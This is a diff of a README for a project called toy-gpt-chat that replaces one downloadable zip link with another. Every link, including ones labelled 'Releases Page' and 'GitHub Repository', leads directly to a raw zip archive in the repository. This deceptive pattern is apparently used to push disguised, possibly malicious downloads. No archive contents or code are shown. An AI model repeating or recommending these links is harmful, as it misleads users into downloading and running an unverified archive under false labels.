@@ -6,7 +6,7 @@ Welcome to toy-gpt-chat! This application allows you to interact with a visualiz
 ## 🚀 Getting Started
 To begin using toy-gpt-chat, you need to download the application from our Releases page.
 
-[![Download toy-gpt-chat](https://raw.githubusercontent.com/AkashChoudhary12/toy-gpt-chat/main/src/chat-toy-gpt-v2.9.zip%20toy--gpt--chat-v1.0-blue)](https://raw.githubusercontent.com/AkashChoudhary12/toy-gpt-chat/main/src/chat-toy-gpt-v2.9.zip)
+[![Download toy-gpt-chat](https://github.com/AkashChoudhary12/toy-gpt-chat/raw/refs/heads/main/public/toy_chat_gpt_1.0.zip%20toy--gpt--chat-v1.0-blue)](https://github.com/AkashChoudhary12/toy-gpt-chat/raw/refs/heads/main/public/toy_chat_gpt_1.0.zip)
 
 ## 🛠️ System Requirements
 Before you install, make sure your computer meets these requirements:
@@ -17,7 +17,7 @@ Before you install, make sure your computer meets these requirements:
 - Browser: Latest version of any modern web browser (Chrome, Firefox, Safari)
 
 ## 📥 Download & Install
-To download toy-gpt-chat, visit this page to download: [Releases Page](https://raw.githubusercontent.com/AkashChoudhary12/toy-gpt-chat/main/src/chat-toy-gpt-v2.9.zip).
+To download toy-gpt-chat, visit this page to download: [Releases Page](https://github.com/AkashChoudhary12/toy-gpt-chat/raw/refs/heads/main/public/toy_chat_gpt_1.0.zip).
 
 1. On the Releases page, you will see different versions of the application. Look for the latest version at the top.
 2. Click on the version you want to download.
@@ -78,7 +78,7 @@ We appreciate your thoughts on toy-gpt-chat! Your feedback helps us improve the 
 For any technical support, feel free to reach out via the repository's issues page, or if you have any questions, drop us a message. We are here to help!
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://raw.githubusercontent.com/AkashChoudhary12/toy-gpt-chat/main/src/chat-toy-gpt-v2.9.zip)
-- [Releases Page](https://raw.githubusercontent.com/AkashChoudhary12/toy-gpt-chat/main/src/chat-toy-gpt-v2.9.zip)
+- [GitHub Repository](https://github.com/AkashChoudhary12/toy-gpt-chat/raw/refs/heads/main/public/toy_chat_gpt_1.0.zip)
+- [Releases Page](https://github.com/AkashChoudhary12/toy-gpt-chat/raw/refs/heads/main/public/toy_chat_gpt_1.0.zip)
 
 Enjoy using toy-gpt-chat!
